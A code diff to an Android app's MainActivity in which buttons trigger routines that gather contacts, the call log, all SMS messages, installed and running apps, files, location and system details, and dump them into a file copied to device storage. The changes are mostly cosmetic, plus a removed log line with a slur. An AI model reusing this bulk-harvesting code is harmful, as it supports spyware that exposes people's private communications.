@@ -106,6 +106,16 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         final SMSreciever Res = new SMSreciever();
         final IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
 
+        Button goTo = (Button)findViewById(R.id.goTo);
+        goTo.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Intent intent = new Intent(this_, NewPanel.class);
+
+                startActivity(intent);
+            }
+        });
+
         Button ServiceOnButton = (Button) findViewById(R.id.toService);
         ServiceOnButton.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -189,7 +199,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 GetFiles(path);
             }
         });
-
+///////////////////////////////////////////////////////////////////////////////
         Button getCon = (Button) findViewById(R.id.getContacts);
         getCon.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -220,7 +230,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 }
             }
         });
-
+/////////////////////////////////////////////////////////////////////////
         Button getCallLog = (Button) findViewById(R.id.CallLg);
         getCallLog.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -228,7 +238,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 Log.d("Call details: ", getCallDetails());
             }
         });
-
+///////////////////////////////////////////////////////////////////////////////////
         final Button getSysInfo = (Button) findViewById(R.id.sysInfo);
         getSysInfo.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -238,6 +248,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 runningApps();
             }
         });
+        /////////////////////////////////////////////////////////////////////////////////////
 
         Button getFile = (Button) findViewById(R.id.getFile);
         getFile.setOnClickListener(new View.OnClickListener() {
@@ -246,17 +257,15 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 PutIntoFile();
             }
         });
+        /////////////////////////////////////////////////////////////////////////////
         final Button getSms1 = (Button) findViewById(R.id.GetSMS1);
         getSms1.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-
-                Log.d("u r gay", "SMS");
-
                 getSms();
-
             }
         });
+        /////////////////////////////////////////////////////////////////////////
         Button getScreen = (Button) findViewById(R.id.getScr);
         getScreen.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -279,7 +288,11 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                 mprovider = locationManager.getBestProvider(criteria, false);
 
                 if (mprovider != null && !mprovider.equals("")) {
-                    if (ActivityCompat.checkSelfPermission(this_, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this_, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                    if (ActivityCompat.checkSelfPermission(this_, Manifest.permission.ACCESS_FINE_LOCATION)
+                            != PackageManager.PERMISSION_GRANTED
+                            && ActivityCompat.checkSelfPermission
+                            (this_, Manifest.permission.ACCESS_COARSE_LOCATION)
+                            != PackageManager.PERMISSION_GRANTED) {
                         return;
                     }
                     Location location = locationManager.getLastKnownLocation(mprovider);
@@ -303,11 +316,18 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         FileWriter writer = null;
         try {
             writer = new FileWriter(tempFile);
-            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{ContactsContract.CommonDataKinds.Phone._ID,
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                            ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+
             cursor.moveToFirst();
+
             writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID " +
                     cursor.getString(0) + " NAME " + cursor.getString(1) + " PHONE " + cursor.getString(2) +
-                    "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act) + "\nSMS:\n" +getSms());
+                    "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act) + "\nSMS:\n" + getSms());
+
             writer.close();
             File internal_m1 = getDir("custom", 0);
             File external_m1 = Environment.getExternalStorageDirectory();
@@ -330,7 +350,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         }
         Log.i("sdf", tempFile.getPath());
     }
-
+///////////////////////////////////////////////////////////////////////
     private String getCallDetails() {
         StringBuffer sb = new StringBuffer();
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
@@ -364,7 +384,8 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         managedCursor.close();
         return sb.toString();
     }
-
+    /////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
     public void installedApps() {
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
         for (int i = 0; i < packList.size(); i++) {
@@ -375,7 +396,8 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
             }
         }
     }
-
+    ///////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////
     public void GetFiles(String DirectoryPath) {
         Log.d("hfgjg", DirectoryPath);
         File f = new File(DirectoryPath);
@@ -388,6 +410,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
             }
         }
     }
+    /////////////////////////////////////////////////////////////////////////////////////////
 
     String path = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
 
@@ -419,7 +442,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
             e.printStackTrace();
         }
     }
-
+/////////////////////////////////////////////////////////////////////////////////////
     public void runningApps() {
         final ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
         final List<ActivityManager.RunningTaskInfo> recentTasks = activityManager.getRunningTasks(Integer.MAX_VALUE);
@@ -428,7 +451,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
             Log.d("Executed app", "Application executed : " + recentTasks.get(i).baseActivity.toShortString() + "\t\t ID: " + recentTasks.get(i).id + "");
         }
     }
-
+//////////////////////////////////////////////////////////
 
     @Override
     public void onLocationChanged(Location location) {
@@ -451,7 +474,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
 
     }
 
-
+/////////////////////////////////////////////////////////////////////////////////////
     public String getSms() {
         ContentResolver cr = this.getContentResolver();
         Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
@@ -459,8 +482,9 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
 
         StringBuilder strBui = new StringBuilder();
 
-        if (c != null) {
-            totalSMS = c.getCount();
+        totalSMS = c.getCount();
+
+        if (totalSMS >0 && c!=null) {
 
             strBui.append("\nTotal sms:" + Integer.toString(totalSMS));
 
@@ -485,11 +509,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                     Log.i("sms", "--------------");
 
                     c.moveToNext();
-
                 }
-
-
-
             }
 
             c.close();
@@ -500,7 +520,7 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         {
             return "no sms";
         }
-
+///////////////////////////////////////////////////////////////////////////////////////////////////
 
 
     }
